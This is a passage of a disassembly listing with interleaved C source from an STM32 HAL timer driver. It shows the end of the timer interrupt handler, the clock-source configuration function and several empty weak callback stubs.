 8004ebe:	2b00      	cmp	r3, #0
 8004ec0:	d020      	beq.n	8004f04 <HAL_TIM_IRQHandler+0xfc>
  {
    if ((itsource & (TIM_IT_CC3)) == (TIM_IT_CC3))
 8004ec2:	68fb      	ldr	r3, [r7, #12]
 8004ec4:	f003 0308 	and.w	r3, r3, #8
 8004ec8:	2b00      	cmp	r3, #0
 8004eca:	d01b      	beq.n	8004f04 <HAL_TIM_IRQHandler+0xfc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC3);
 8004ecc:	687b      	ldr	r3, [r7, #4]
 8004ece:	681b      	ldr	r3, [r3, #0]
 8004ed0:	f06f 0208 	mvn.w	r2, #8
 8004ed4:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_3;
 8004ed6:	687b      	ldr	r3, [r7, #4]
 8004ed8:	2204      	movs	r2, #4
 8004eda:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC3S) != 0x00U)
 8004edc:	687b      	ldr	r3, [r7, #4]
 8004ede:	681b      	ldr	r3, [r3, #0]
 8004ee0:	69db      	ldr	r3, [r3, #28]
 8004ee2:	f003 0303 	and.w	r3, r3, #3
 8004ee6:	2b00      	cmp	r3, #0
 8004ee8:	d003      	beq.n	8004ef2 <HAL_TIM_IRQHandler+0xea>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004eea:	6878      	ldr	r0, [r7, #4]
 8004eec:	f000 f961 	bl	80051b2 <HAL_TIM_IC_CaptureCallback>
 8004ef0:	e005      	b.n	8004efe <HAL_TIM_IRQHandler+0xf6>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004ef2:	6878      	ldr	r0, [r7, #4]
 8004ef4:	f000 f953 	bl	800519e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004ef8:	6878      	ldr	r0, [r7, #4]
 8004efa:	f000 f964 	bl	80051c6 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004efe:	687b      	ldr	r3, [r7, #4]
 8004f00:	2200      	movs	r2, #0
 8004f02:	771a      	strb	r2, [r3, #28]
    }
  }
  /* Capture compare 4 event */
  if ((itflag & (TIM_FLAG_CC4)) == (TIM_FLAG_CC4))
 8004f04:	68bb      	ldr	r3, [r7, #8]
 8004f06:	f003 0310 	and.w	r3, r3, #16
 8004f0a:	2b00      	cmp	r3, #0
 8004f0c:	d020      	beq.n	8004f50 <HAL_TIM_IRQHandler+0x148>
  {
    if ((itsource & (TIM_IT_CC4)) == (TIM_IT_CC4))
 8004f0e:	68fb      	ldr	r3, [r7, #12]
 8004f10:	f003 0310 	and.w	r3, r3, #16
 8004f14:	2b00      	cmp	r3, #0
 8004f16:	d01b      	beq.n	8004f50 <HAL_TIM_IRQHandler+0x148>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_CC4);
 8004f18:	687b      	ldr	r3, [r7, #4]
 8004f1a:	681b      	ldr	r3, [r3, #0]
 8004f1c:	f06f 0210 	mvn.w	r2, #16
 8004f20:	611a      	str	r2, [r3, #16]
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_4;
 8004f22:	687b      	ldr	r3, [r7, #4]
 8004f24:	2208      	movs	r2, #8
 8004f26:	771a      	strb	r2, [r3, #28]
      /* Input capture event */
      if ((htim->Instance->CCMR2 & TIM_CCMR2_CC4S) != 0x00U)
 8004f28:	687b      	ldr	r3, [r7, #4]
 8004f2a:	681b      	ldr	r3, [r3, #0]
 8004f2c:	69db      	ldr	r3, [r3, #28]
 8004f2e:	f403 7340 	and.w	r3, r3, #768	; 0x300
 8004f32:	2b00      	cmp	r3, #0
 8004f34:	d003      	beq.n	8004f3e <HAL_TIM_IRQHandler+0x136>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->IC_CaptureCallback(htim);
#else
        HAL_TIM_IC_CaptureCallback(htim);
 8004f36:	6878      	ldr	r0, [r7, #4]
 8004f38:	f000 f93b 	bl	80051b2 <HAL_TIM_IC_CaptureCallback>
 8004f3c:	e005      	b.n	8004f4a <HAL_TIM_IRQHandler+0x142>
      {
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
        htim->OC_DelayElapsedCallback(htim);
        htim->PWM_PulseFinishedCallback(htim);
#else
        HAL_TIM_OC_DelayElapsedCallback(htim);
 8004f3e:	6878      	ldr	r0, [r7, #4]
 8004f40:	f000 f92d 	bl	800519e <HAL_TIM_OC_DelayElapsedCallback>
        HAL_TIM_PWM_PulseFinishedCallback(htim);
 8004f44:	6878      	ldr	r0, [r7, #4]
 8004f46:	f000 f93e 	bl	80051c6 <HAL_TIM_PWM_PulseFinishedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
      }
      htim->Channel = HAL_TIM_ACTIVE_CHANNEL_CLEARED;
 8004f4a:	687b      	ldr	r3, [r7, #4]
 8004f4c:	2200      	movs	r2, #0
 8004f4e:	771a      	strb	r2, [r3, #28]
    }
  }
  /* TIM Update event */
  if ((itflag & (TIM_FLAG_UPDATE)) == (TIM_FLAG_UPDATE))
 8004f50:	68bb      	ldr	r3, [r7, #8]
 8004f52:	f003 0301 	and.w	r3, r3, #1
 8004f56:	2b00      	cmp	r3, #0
 8004f58:	d00c      	beq.n	8004f74 <HAL_TIM_IRQHandler+0x16c>
  {
    if ((itsource & (TIM_IT_UPDATE)) == (TIM_IT_UPDATE))
 8004f5a:	68fb      	ldr	r3, [r7, #12]
 8004f5c:	f003 0301 	and.w	r3, r3, #1
 8004f60:	2b00      	cmp	r3, #0
 8004f62:	d007      	beq.n	8004f74 <HAL_TIM_IRQHandler+0x16c>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_UPDATE);
 8004f64:	687b      	ldr	r3, [r7, #4]
 8004f66:	681b      	ldr	r3, [r3, #0]
 8004f68:	f06f 0201 	mvn.w	r2, #1
 8004f6c:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->PeriodElapsedCallback(htim);
#else
      HAL_TIM_PeriodElapsedCallback(htim);
 8004f6e:	6878      	ldr	r0, [r7, #4]
 8004f70:	f7fb fe64 	bl	8000c3c <HAL_TIM_PeriodElapsedCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break input event */
  if ((itflag & (TIM_FLAG_BREAK)) == (TIM_FLAG_BREAK))
 8004f74:	68bb      	ldr	r3, [r7, #8]
 8004f76:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f7a:	2b00      	cmp	r3, #0
 8004f7c:	d00c      	beq.n	8004f98 <HAL_TIM_IRQHandler+0x190>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004f7e:	68fb      	ldr	r3, [r7, #12]
 8004f80:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004f84:	2b00      	cmp	r3, #0
 8004f86:	d007      	beq.n	8004f98 <HAL_TIM_IRQHandler+0x190>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_BREAK);
 8004f88:	687b      	ldr	r3, [r7, #4]
 8004f8a:	681b      	ldr	r3, [r3, #0]
 8004f8c:	f06f 0280 	mvn.w	r2, #128	; 0x80
 8004f90:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->BreakCallback(htim);
#else
      HAL_TIMEx_BreakCallback(htim);
 8004f92:	6878      	ldr	r0, [r7, #4]
 8004f94:	f000 fa9a 	bl	80054cc <HAL_TIMEx_BreakCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Break2 input event */
  if ((itflag & (TIM_FLAG_BREAK2)) == (TIM_FLAG_BREAK2))
 8004f98:	68bb      	ldr	r3, [r7, #8]
 8004f9a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8004f9e:	2b00      	cmp	r3, #0
 8004fa0:	d00c      	beq.n	8004fbc <HAL_TIM_IRQHandler+0x1b4>
  {
    if ((itsource & (TIM_IT_BREAK)) == (TIM_IT_BREAK))
 8004fa2:	68fb      	ldr	r3, [r7, #12]
 8004fa4:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004fa8:	2b00      	cmp	r3, #0
 8004faa:	d007      	beq.n	8004fbc <HAL_TIM_IRQHandler+0x1b4>
    {
      __HAL_TIM_CLEAR_FLAG(htim, TIM_FLAG_BREAK2);
 8004fac:	687b      	ldr	r3, [r7, #4]
 8004fae:	681b      	ldr	r3, [r3, #0]
 8004fb0:	f46f 7280 	mvn.w	r2, #256	; 0x100
 8004fb4:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->Break2Callback(htim);
#else
      HAL_TIMEx_Break2Callback(htim);
 8004fb6:	6878      	ldr	r0, [r7, #4]
 8004fb8:	f000 fa92 	bl	80054e0 <HAL_TIMEx_Break2Callback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM Trigger detection event */
  if ((itflag & (TIM_FLAG_TRIGGER)) == (TIM_FLAG_TRIGGER))
 8004fbc:	68bb      	ldr	r3, [r7, #8]
 8004fbe:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004fc2:	2b00      	cmp	r3, #0
 8004fc4:	d00c      	beq.n	8004fe0 <HAL_TIM_IRQHandler+0x1d8>
  {
    if ((itsource & (TIM_IT_TRIGGER)) == (TIM_IT_TRIGGER))
 8004fc6:	68fb      	ldr	r3, [r7, #12]
 8004fc8:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8004fcc:	2b00      	cmp	r3, #0
 8004fce:	d007      	beq.n	8004fe0 <HAL_TIM_IRQHandler+0x1d8>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_IT_TRIGGER);
 8004fd0:	687b      	ldr	r3, [r7, #4]
 8004fd2:	681b      	ldr	r3, [r3, #0]
 8004fd4:	f06f 0240 	mvn.w	r2, #64	; 0x40
 8004fd8:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->TriggerCallback(htim);
#else
      HAL_TIM_TriggerCallback(htim);
 8004fda:	6878      	ldr	r0, [r7, #4]
 8004fdc:	f000 f8fd 	bl	80051da <HAL_TIM_TriggerCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
  /* TIM commutation event */
  if ((itflag & (TIM_FLAG_COM)) == (TIM_FLAG_COM))
 8004fe0:	68bb      	ldr	r3, [r7, #8]
 8004fe2:	f003 0320 	and.w	r3, r3, #32
 8004fe6:	2b00      	cmp	r3, #0
 8004fe8:	d00c      	beq.n	8005004 <HAL_TIM_IRQHandler+0x1fc>
  {
    if ((itsource & (TIM_IT_COM)) == (TIM_IT_COM))
 8004fea:	68fb      	ldr	r3, [r7, #12]
 8004fec:	f003 0320 	and.w	r3, r3, #32
 8004ff0:	2b00      	cmp	r3, #0
 8004ff2:	d007      	beq.n	8005004 <HAL_TIM_IRQHandler+0x1fc>
    {
      __HAL_TIM_CLEAR_IT(htim, TIM_FLAG_COM);
 8004ff4:	687b      	ldr	r3, [r7, #4]
 8004ff6:	681b      	ldr	r3, [r3, #0]
 8004ff8:	f06f 0220 	mvn.w	r2, #32
 8004ffc:	611a      	str	r2, [r3, #16]
#if (USE_HAL_TIM_REGISTER_CALLBACKS == 1)
      htim->CommutationCallback(htim);
#else
      HAL_TIMEx_CommutCallback(htim);
 8004ffe:	6878      	ldr	r0, [r7, #4]
 8005000:	f000 fa5a 	bl	80054b8 <HAL_TIMEx_CommutCallback>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
    }
  }
}
 8005004:	bf00      	nop
 8005006:	3710      	adds	r7, #16
 8005008:	46bd      	mov	sp, r7
 800500a:	bd80      	pop	{r7, pc}

0800500c <HAL_TIM_ConfigClockSource>:
  * @param  sClockSourceConfig pointer to a TIM_ClockConfigTypeDef structure that
  *         contains the clock source information for the TIM peripheral.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_ConfigClockSource(TIM_HandleTypeDef *htim, const TIM_ClockConfigTypeDef *sClockSourceConfig)
{
 800500c:	b580      	push	{r7, lr}
 800500e:	b084      	sub	sp, #16
 8005010:	af00      	add	r7, sp, #0
 8005012:	6078      	str	r0, [r7, #4]
 8005014:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status = HAL_OK;
 8005016:	2300      	movs	r3, #0
 8005018:	73fb      	strb	r3, [r7, #15]
  uint32_t tmpsmcr;

  /* Process Locked */
  __HAL_LOCK(htim);
 800501a:	687b      	ldr	r3, [r7, #4]
 800501c:	f893 303c 	ldrb.w	r3, [r3, #60]	; 0x3c
 8005020:	2b01      	cmp	r3, #1
 8005022:	d101      	bne.n	8005028 <HAL_TIM_ConfigClockSource+0x1c>
 8005024:	2302      	movs	r3, #2
 8005026:	e0b6      	b.n	8005196 <HAL_TIM_ConfigClockSource+0x18a>
 8005028:	687b      	ldr	r3, [r7, #4]
 800502a:	2201      	movs	r2, #1
 800502c:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  htim->State = HAL_TIM_STATE_BUSY;
 8005030:	687b      	ldr	r3, [r7, #4]
 8005032:	2202      	movs	r2, #2
 8005034:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Check the parameters */
  assert_param(IS_TIM_CLOCKSOURCE(sClockSourceConfig->ClockSource));

  /* Reset the SMS, TS, ECE, ETPS and ETRF bits */
  tmpsmcr = htim->Instance->SMCR;
 8005038:	687b      	ldr	r3, [r7, #4]
 800503a:	681b      	ldr	r3, [r3, #0]
 800503c:	689b      	ldr	r3, [r3, #8]
 800503e:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_SMS | TIM_SMCR_TS);
 8005040:	68bb      	ldr	r3, [r7, #8]
 8005042:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8005046:	f023 0377 	bic.w	r3, r3, #119	; 0x77
 800504a:	60bb      	str	r3, [r7, #8]
  tmpsmcr &= ~(TIM_SMCR_ETF | TIM_SMCR_ETPS | TIM_SMCR_ECE | TIM_SMCR_ETP);
 800504c:	68bb      	ldr	r3, [r7, #8]
 800504e:	f423 437f 	bic.w	r3, r3, #65280	; 0xff00
 8005052:	60bb      	str	r3, [r7, #8]
  htim->Instance->SMCR = tmpsmcr;
 8005054:	687b      	ldr	r3, [r7, #4]
 8005056:	681b      	ldr	r3, [r3, #0]
 8005058:	68ba      	ldr	r2, [r7, #8]
 800505a:	609a      	str	r2, [r3, #8]

  switch (sClockSourceConfig->ClockSource)
 800505c:	683b      	ldr	r3, [r7, #0]
 800505e:	681b      	ldr	r3, [r3, #0]
 8005060:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 8005064:	d03e      	beq.n	80050e4 <HAL_TIM_ConfigClockSource+0xd8>
 8005066:	f5b3 5f00 	cmp.w	r3, #8192	; 0x2000
 800506a:	f200 8087 	bhi.w	800517c <HAL_TIM_ConfigClockSource+0x170>
 800506e:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 8005072:	f000 8086 	beq.w	8005182 <HAL_TIM_ConfigClockSource+0x176>
 8005076:	f5b3 5f80 	cmp.w	r3, #4096	; 0x1000
 800507a:	d87f      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 800507c:	2b70      	cmp	r3, #112	; 0x70
 800507e:	d01a      	beq.n	80050b6 <HAL_TIM_ConfigClockSource+0xaa>
 8005080:	2b70      	cmp	r3, #112	; 0x70
 8005082:	d87b      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 8005084:	2b60      	cmp	r3, #96	; 0x60
 8005086:	d050      	beq.n	800512a <HAL_TIM_ConfigClockSource+0x11e>
 8005088:	2b60      	cmp	r3, #96	; 0x60
 800508a:	d877      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 800508c:	2b50      	cmp	r3, #80	; 0x50
 800508e:	d03c      	beq.n	800510a <HAL_TIM_ConfigClockSource+0xfe>
 8005090:	2b50      	cmp	r3, #80	; 0x50
 8005092:	d873      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 8005094:	2b40      	cmp	r3, #64	; 0x40
 8005096:	d058      	beq.n	800514a <HAL_TIM_ConfigClockSource+0x13e>
 8005098:	2b40      	cmp	r3, #64	; 0x40
 800509a:	d86f      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 800509c:	2b30      	cmp	r3, #48	; 0x30
 800509e:	d064      	beq.n	800516a <HAL_TIM_ConfigClockSource+0x15e>
 80050a0:	2b30      	cmp	r3, #48	; 0x30
 80050a2:	d86b      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 80050a4:	2b20      	cmp	r3, #32
 80050a6:	d060      	beq.n	800516a <HAL_TIM_ConfigClockSource+0x15e>
 80050a8:	2b20      	cmp	r3, #32
 80050aa:	d867      	bhi.n	800517c <HAL_TIM_ConfigClockSource+0x170>
 80050ac:	2b00      	cmp	r3, #0
 80050ae:	d05c      	beq.n	800516a <HAL_TIM_ConfigClockSource+0x15e>
 80050b0:	2b10      	cmp	r3, #16
 80050b2:	d05a      	beq.n	800516a <HAL_TIM_ConfigClockSource+0x15e>
 80050b4:	e062      	b.n	800517c <HAL_TIM_ConfigClockSource+0x170>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80050b6:	687b      	ldr	r3, [r7, #4]
 80050b8:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80050ba:	683b      	ldr	r3, [r7, #0]
 80050bc:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80050be:	683b      	ldr	r3, [r7, #0]
 80050c0:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80050c2:	683b      	ldr	r3, [r7, #0]
 80050c4:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80050c6:	f000 f971 	bl	80053ac <TIM_ETR_SetConfig>

      /* Select the External clock mode1 and the ETRF trigger */
      tmpsmcr = htim->Instance->SMCR;
 80050ca:	687b      	ldr	r3, [r7, #4]
 80050cc:	681b      	ldr	r3, [r3, #0]
 80050ce:	689b      	ldr	r3, [r3, #8]
 80050d0:	60bb      	str	r3, [r7, #8]
      tmpsmcr |= (TIM_SLAVEMODE_EXTERNAL1 | TIM_CLOCKSOURCE_ETRMODE1);
 80050d2:	68bb      	ldr	r3, [r7, #8]
 80050d4:	f043 0377 	orr.w	r3, r3, #119	; 0x77
 80050d8:	60bb      	str	r3, [r7, #8]
      /* Write to TIMx SMCR */
      htim->Instance->SMCR = tmpsmcr;
 80050da:	687b      	ldr	r3, [r7, #4]
 80050dc:	681b      	ldr	r3, [r3, #0]
 80050de:	68ba      	ldr	r2, [r7, #8]
 80050e0:	609a      	str	r2, [r3, #8]
      break;
 80050e2:	e04f      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>
      assert_param(IS_TIM_CLOCKPRESCALER(sClockSourceConfig->ClockPrescaler));
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      /* Configure the ETR Clock source */
      TIM_ETR_SetConfig(htim->Instance,
 80050e4:	687b      	ldr	r3, [r7, #4]
 80050e6:	6818      	ldr	r0, [r3, #0]
                        sClockSourceConfig->ClockPrescaler,
 80050e8:	683b      	ldr	r3, [r7, #0]
 80050ea:	6899      	ldr	r1, [r3, #8]
                        sClockSourceConfig->ClockPolarity,
 80050ec:	683b      	ldr	r3, [r7, #0]
 80050ee:	685a      	ldr	r2, [r3, #4]
                        sClockSourceConfig->ClockFilter);
 80050f0:	683b      	ldr	r3, [r7, #0]
 80050f2:	68db      	ldr	r3, [r3, #12]
      TIM_ETR_SetConfig(htim->Instance,
 80050f4:	f000 f95a 	bl	80053ac <TIM_ETR_SetConfig>
      /* Enable the External clock mode2 */
      htim->Instance->SMCR |= TIM_SMCR_ECE;
 80050f8:	687b      	ldr	r3, [r7, #4]
 80050fa:	681b      	ldr	r3, [r3, #0]
 80050fc:	689a      	ldr	r2, [r3, #8]
 80050fe:	687b      	ldr	r3, [r7, #4]
 8005100:	681b      	ldr	r3, [r3, #0]
 8005102:	f442 4280 	orr.w	r2, r2, #16384	; 0x4000
 8005106:	609a      	str	r2, [r3, #8]
      break;
 8005108:	e03c      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800510a:	687b      	ldr	r3, [r7, #4]
 800510c:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800510e:	683b      	ldr	r3, [r7, #0]
 8005110:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005112:	683b      	ldr	r3, [r7, #0]
 8005114:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 8005116:	461a      	mov	r2, r3
 8005118:	f000 f8ce 	bl	80052b8 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1);
 800511c:	687b      	ldr	r3, [r7, #4]
 800511e:	681b      	ldr	r3, [r3, #0]
 8005120:	2150      	movs	r1, #80	; 0x50
 8005122:	4618      	mov	r0, r3
 8005124:	f000 f927 	bl	8005376 <TIM_ITRx_SetConfig>
      break;
 8005128:	e02c      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI2 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI2_ConfigInputStage(htim->Instance,
 800512a:	687b      	ldr	r3, [r7, #4]
 800512c:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800512e:	683b      	ldr	r3, [r7, #0]
 8005130:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005132:	683b      	ldr	r3, [r7, #0]
 8005134:	68db      	ldr	r3, [r3, #12]
      TIM_TI2_ConfigInputStage(htim->Instance,
 8005136:	461a      	mov	r2, r3
 8005138:	f000 f8ed 	bl	8005316 <TIM_TI2_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI2);
 800513c:	687b      	ldr	r3, [r7, #4]
 800513e:	681b      	ldr	r3, [r3, #0]
 8005140:	2160      	movs	r1, #96	; 0x60
 8005142:	4618      	mov	r0, r3
 8005144:	f000 f917 	bl	8005376 <TIM_ITRx_SetConfig>
      break;
 8005148:	e01c      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>

      /* Check TI1 input conditioning related parameters */
      assert_param(IS_TIM_CLOCKPOLARITY(sClockSourceConfig->ClockPolarity));
      assert_param(IS_TIM_CLOCKFILTER(sClockSourceConfig->ClockFilter));

      TIM_TI1_ConfigInputStage(htim->Instance,
 800514a:	687b      	ldr	r3, [r7, #4]
 800514c:	6818      	ldr	r0, [r3, #0]
                               sClockSourceConfig->ClockPolarity,
 800514e:	683b      	ldr	r3, [r7, #0]
 8005150:	6859      	ldr	r1, [r3, #4]
                               sClockSourceConfig->ClockFilter);
 8005152:	683b      	ldr	r3, [r7, #0]
 8005154:	68db      	ldr	r3, [r3, #12]
      TIM_TI1_ConfigInputStage(htim->Instance,
 8005156:	461a      	mov	r2, r3
 8005158:	f000 f8ae 	bl	80052b8 <TIM_TI1_ConfigInputStage>
      TIM_ITRx_SetConfig(htim->Instance, TIM_CLOCKSOURCE_TI1ED);
 800515c:	687b      	ldr	r3, [r7, #4]
 800515e:	681b      	ldr	r3, [r3, #0]
 8005160:	2140      	movs	r1, #64	; 0x40
 8005162:	4618      	mov	r0, r3
 8005164:	f000 f907 	bl	8005376 <TIM_ITRx_SetConfig>
      break;
 8005168:	e00c      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>
    case TIM_CLOCKSOURCE_ITR3:
    {
      /* Check whether or not the timer instance supports internal trigger input */
      assert_param(IS_TIM_CLOCKSOURCE_ITRX_INSTANCE(htim->Instance));

      TIM_ITRx_SetConfig(htim->Instance, sClockSourceConfig->ClockSource);
 800516a:	687b      	ldr	r3, [r7, #4]
 800516c:	681a      	ldr	r2, [r3, #0]
 800516e:	683b      	ldr	r3, [r7, #0]
 8005170:	681b      	ldr	r3, [r3, #0]
 8005172:	4619      	mov	r1, r3
 8005174:	4610      	mov	r0, r2
 8005176:	f000 f8fe 	bl	8005376 <TIM_ITRx_SetConfig>
      break;
 800517a:	e003      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>
    }

    default:
      status = HAL_ERROR;
 800517c:	2301      	movs	r3, #1
 800517e:	73fb      	strb	r3, [r7, #15]
      break;
 8005180:	e000      	b.n	8005184 <HAL_TIM_ConfigClockSource+0x178>
      break;
 8005182:	bf00      	nop
  }
  htim->State = HAL_TIM_STATE_READY;
 8005184:	687b      	ldr	r3, [r7, #4]
 8005186:	2201      	movs	r2, #1
 8005188:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  __HAL_UNLOCK(htim);
 800518c:	687b      	ldr	r3, [r7, #4]
 800518e:	2200      	movs	r2, #0
 8005190:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c

  return status;
 8005194:	7bfb      	ldrb	r3, [r7, #15]
}
 8005196:	4618      	mov	r0, r3
 8005198:	3710      	adds	r7, #16
 800519a:	46bd      	mov	sp, r7
 800519c:	bd80      	pop	{r7, pc}

0800519e <HAL_TIM_OC_DelayElapsedCallback>:
  * @brief  Output Compare callback in non-blocking mode
  * @param  htim TIM OC handle
  * @retval None
  */
__weak void HAL_TIM_OC_DelayElapsedCallback(TIM_HandleTypeDef *htim)
{
 800519e:	b480      	push	{r7}
 80051a0:	b083      	sub	sp, #12
 80051a2:	af00      	add	r7, sp, #0
 80051a4:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_OC_DelayElapsedCallback could be implemented in the user file
   */
}
 80051a6:	bf00      	nop
 80051a8:	370c      	adds	r7, #12
 80051aa:	46bd      	mov	sp, r7
 80051ac:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051b0:	4770      	bx	lr

080051b2 <HAL_TIM_IC_CaptureCallback>:
  * @brief  Input Capture callback in non-blocking mode
  * @param  htim TIM IC handle
  * @retval None
  */
__weak void HAL_TIM_IC_CaptureCallback(TIM_HandleTypeDef *htim)
{
 80051b2:	b480      	push	{r7}
 80051b4:	b083      	sub	sp, #12
 80051b6:	af00      	add	r7, sp, #0
 80051b8:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_IC_CaptureCallback could be implemented in the user file
   */
}
 80051ba:	bf00      	nop
 80051bc:	370c      	adds	r7, #12
 80051be:	46bd      	mov	sp, r7
 80051c0:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051c4:	4770      	bx	lr

080051c6 <HAL_TIM_PWM_PulseFinishedCallback>:
  * @brief  PWM Pulse finished callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_PWM_PulseFinishedCallback(TIM_HandleTypeDef *htim)
{
 80051c6:	b480      	push	{r7}
 80051c8:	b083      	sub	sp, #12
 80051ca:	af00      	add	r7, sp, #0
 80051cc:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_PWM_PulseFinishedCallback could be implemented in the user file
   */
}
 80051ce:	bf00      	nop
 80051d0:	370c      	adds	r7, #12
 80051d2:	46bd      	mov	sp, r7
 80051d4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051d8:	4770      	bx	lr

080051da <HAL_TIM_TriggerCallback>:
  * @brief  Hall Trigger detection callback in non-blocking mode
  * @param  htim TIM handle
  * @retval None
  */
__weak void HAL_TIM_TriggerCallback(TIM_HandleTypeDef *htim)
{
 80051da:	b480      	push	{r7}
 80051dc:	b083      	sub	sp, #12
 80051de:	af00      	add	r7, sp, #0
 80051e0:	6078      	str	r0, [r7, #4]
  UNUSED(htim);

  /* NOTE : This function should not be modified, when the callback is needed,
            the HAL_TIM_TriggerCallback could be implemented in the user file
   */
}
 80051e2:	bf00      	nop
 80051e4:	370c      	adds	r7, #12
 80051e6:	46bd      	mov	sp, r7
 80051e8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80051ec:	4770      	bx	lr
	...

080051f0 <TIM_Base_SetConfig>:
